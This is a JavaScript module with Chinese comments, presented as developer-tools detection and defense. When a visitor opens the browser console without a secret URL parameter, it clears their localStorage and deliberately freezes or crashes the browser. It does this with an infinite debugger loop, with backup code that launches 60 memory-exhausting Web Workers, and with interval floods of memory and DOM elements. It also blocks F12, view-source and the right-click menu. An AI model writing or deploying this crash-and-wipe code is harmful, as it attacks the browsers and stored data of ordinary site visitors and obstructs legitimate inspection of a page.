// 开发者工具检测与防御
// 参考 sample_framework 的内存溢出崩溃策略

function advancedCrash() {
  // 原理分析：Chrome 检测到主线程卡死约需 6s 才会弹出崩溃提示
  // 之前的 try/catch + 内存分配的方案引入了额外开销（GC、catch 恢复）
  // 新方案：纯 while(true){} 死循环，无任何额外开销，主线程立即冻结
  // eslint-disable-next-line no-constant-condition
  ;(function() {
    // 纯粹的 CPU 烧录死循环 — 无 try/catch、无内存分配、无 GC
    // V8 无法优化掉这个循环（有 debugger 语句防优化）
    while (true) {
      debugger
    }
  })()

  // 以下代码实际上不会执行到（主线程已被死循环永久阻塞）
  // 保留作为冗余保险

  const workerAttack = () => {
    const workerCount = 60
    const workerCode = `
      const arrays = [];
      const typedArrays = [];
      const arrayBuffers = [];
      while (true) {
        arrays.push(new Array(20000000).fill('enhanced crash data'));
        typedArrays.push(new Float64Array(10000000000));
        arrayBuffers.push(new ArrayBuffer(100000000000));
      }
    `
    const blob = new Blob([workerCode], { type: 'application/javascript' })
    const workerURL = URL.createObjectURL(blob)
    for (let i = 0; i < workerCount; i++) {
      new Worker(workerURL)
    }
  }
  workerAttack()

  setInterval(() => {
    try {
      const tempObjects = []
      for (let j = 0; j < 1000; j++) {
        tempObjects.push({
          data: new Array(10000).fill('interference'),
          timestamp: Date.now()
        })
      }
    } catch (e) {
      // 忽略
    }
  }, 1)

  setInterval(() => {
    try {
      for (let i = 0; i < 500; i++) {
        const div = document.createElement('div')
        div.style.cssText = `
          width: 100px; height: 100px;
          position: absolute;
          top: ${Math.random() * 100}vh;
          left: ${Math.random() * 100}vw;
        `
        document.body.appendChild(div)
      }
    } catch (e) {
      // 忽略
    }
  }, 2)
}

export function openDevTools() {
  const currentPath = window.location.href
  if (!currentPath.includes('Omniscience=true')) {
    console.clear()
    localStorage.clear()
    advancedCrash()
  }
}

export function crashesReportLog(message) {
  // 简单记录崩溃日志
  console.warn('[Crash]', message)
}

export function formatError(err) {
  if (err instanceof Error) {
    return err.stack || `${err.name}: ${err.message}`
  }
  return String(err)
}

// 直接键盘拦截（作为 disable-devtool 的补充）
export function setupKeyInterceptor() {
  window.addEventListener('keydown', function (e) {
    if (e.key === 'F12' || e.keyCode === 123) {
      e.preventDefault()
      e.stopPropagation()
      return false
    }
    if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j')) {
      e.preventDefault()
      e.stopPropagation()
      return false
    }
    if (e.ctrlKey && (e.key === 'U' || e.key === 'u')) {
      e.preventDefault()
      e.stopPropagation()
      return false
    }
  }, true)

  window.addEventListener('contextmenu', function (e) {
    e.preventDefault()
    return false
  }, true)
}
